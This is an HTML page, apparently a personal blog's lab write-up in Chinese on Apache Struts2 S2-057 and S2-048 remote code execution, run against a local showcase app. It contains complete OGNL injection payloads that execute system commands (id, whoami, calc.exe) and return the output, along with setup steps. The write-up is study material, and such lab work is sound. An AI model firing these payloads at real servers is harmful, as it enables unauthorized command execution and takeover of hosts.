@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>struts2实验 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">struts2实验</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 12, 2020&nbsp;&nbsp;22:48:45</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+						<span id="/2020/07/12/struts2%E5%AE%9E%E9%AA%8C/" class="leancloud-visitors view" data-flag-title="struts2实验">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Struts2-057实验"><a href="#Struts2-057实验" class="headerlink" title="Struts2 057实验"></a>Struts2 057实验</h1><p>参考：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://blog.csdn.net/weixin_43625577/article/details/97111575">https://blog.csdn.net/weixin_43625577/article/details/97111575</a></p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.sinesafe.com/article/20180823/struts2057.html">https://www.sinesafe.com/article/20180823/struts2057.html</a></p>
+<p>受影响的版本是ApacheStruts 2.3–Apache Struts2.3.34、Apache Struts2.5–Apache Struts2.5.16等系列版本</p>
+<blockquote>
+<p>注意事项：</p>
+<p>首先在struts.xml配置文件添加<constant name="struts.mapper.alwaysSelectFullNamespace" value="true" /></p>
+<p>其次修改配置文件struts-actionchaining.xml 删掉namespace属性，或使用了通配符*</p>
+<p>最后把type=”chain”改成type=”redirectAction”两个文件都要改</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击payload: http:&#x2F;&#x2F;192.168.0.127:8080&#x2F;struts2-showcase&#x2F;$&#123;(1+1)&#125;&#x2F;actionChain1.action</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&#39;calc.exe&#39;)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;</span><br><span class="line"></span><br><span class="line">(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct&#x3D;#request[&#39;struts.valueStack&#39;].context).(#cr&#x3D;#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou&#x3D;#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/strus/1.jpg"></p>
+<h1 id="Struts2-048实验"><a href="#Struts2-048实验" class="headerlink" title="Struts2 048实验"></a>Struts2 048实验</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.ichunqiu.com/course/58753">https://www.ichunqiu.com/course/58753</a></p>
+<p>使用方法struts2_S2-048.py <code>&lt;url&gt;  &lt;cmd&gt;</code></p>
+<p><img src="/image/strus/2.jpg"></p>
+<h3 id="二、-影响版本："><a href="#二、-影响版本：" class="headerlink" title="二、 影响版本："></a>二、 影响版本：</h3><p>Struts 2.3.x with Struts 1 plugin and Struts 1 action</p>
+<h3 id="三、-漏洞介绍："><a href="#三、-漏洞介绍：" class="headerlink" title="三、 漏洞介绍："></a>三、 漏洞介绍：</h3><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
+<p><strong>产生原因：</strong></p>
+<p>这个漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用。</p>
+<p>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。</p>
+<h3 id="四、-环境搭建："><a href="#四、-环境搭建：" class="headerlink" title="四、 环境搭建："></a>四、 环境搭建：</h3><p>参考网址：</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://netsecurity.51cto.com/art/201707/544837.htm">http://netsecurity.51cto.com/art/201707/544837.htm</a></p>
+<p>下载/struts/2.3.24</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://archive.apache.org/dist/struts/2.3.24/">http://archive.apache.org/dist/struts/2.3.24/</a></p>
+<p>百度云链接：链接：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://pan.baidu.com/s/1dFeUyNv">http://pan.baidu.com/s/1dFeUyNv</a>密码：279t</p>
+<p>下载安装xampp</p>
+<p>部署showcase</p>
+<p><img src="/image/strus/3.jpg"></p>
+<p>解压</p>
+<p><img src="/image/strus/4.jpg"></p>
+<p>复制到</p>
+<p><img src="/image/strus/5.jpg"></p>
+<p>重启tomcat</p>
+<p><img src="/image/strus/6.jpg"></p>
+<p>已成功自动部署</p>
+<p><img src="/image/strus/7.jpg"></p>
+<h3 id="五、-测试网址："><a href="#五、-测试网址：" class="headerlink" title="五、 测试网址："></a>五、 测试网址：</h3><p>访问<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://127.0.0.1:8080/struts2-showcase/index.action">http://127.0.0.1:8080/struts2-showcase/index.action</a></p>
+<p><img src="/image/strus/8.jpg"></p>
+<p>进入<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://127.0.0.1:8080/struts2-showcase/integration/editGangster.action">http://127.0.0.1:8080/struts2-showcase/integration/editGangster.action</a></p>
+<p>以第一个参数为攻击点，在其执行OGNL语法，${10-7}，</p>
+<p><img src="/image/strus/9.jpg"></p>
+<p>成功执行</p>
+<p><img src="/image/strus/10.jpg"></p>
+<p>抓包</p>
+<p>注意端口不要重复,即不要与以下重复</p>
+<p><img src="/image/strus/11.jpg"></p>
+<p>我这里用的是9090</p>
+<p><img src="/image/strus/12.jpg"></p>
+<p>抓包获取</p>
+<p><img src="/image/strus/13.jpg"></p>
+<p>修改Conten-Type:为（粗体部分为命令）</p>
+<h3 id="六、-POC"><a href="#六、-POC" class="headerlink" title="六、 POC:"></a>六、 POC:</h3><blockquote>
+<p>${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef=’echo s2-048-EXISTS’).(#iswin=(@\u006Aava.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#efe=(#iswin?{‘cmd.exe’,’/c’,#ef}:{‘/bin/bash’,’-c’,#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}”, ‘age’:’bbb’, ‘__checkbox_bustedBefore’:’true’, ‘description’:’ccc’</p>
+</blockquote>
+<p>视频里的payload为</p>
+<blockquote>
+<p>%{(#_=’multipart/form-data’).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=’whoami’).(#iswin=(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds=(#iswin?{‘cmd.exe’,’/c’,#cmd}:{‘/bin/bash’,’-c’,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</p>
+</blockquote>
+<p>即</p>
+<p><img src="/image/strus/15.jpg"></p>
+<h3 id="七、执行结果"><a href="#七、执行结果" class="headerlink" title="七、执行结果"></a>七、执行结果</h3><p><img src="/image/strus/14.jpg"></p>
+<p>(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2020/07/12/struts2%E5%AE%9E%E9%AA%8C/">https://zhangyanlady.github.io/2020/07/12/struts2%E5%AE%9E%E9%AA%8C/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/07/23/%E6%97%81%E6%B3%A8%E3%80%81%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83%E3%80%81%E8%B7%A8%E5%BA%93%E3%80%81CDN%E7%BB%95%E8%BF%87/">旁注、目录越权、跨库、CDN绕过</a>
+            
+            
+            <a class="next" rel="next" href="/2020/05/17/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E/">常见端口及其漏洞</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
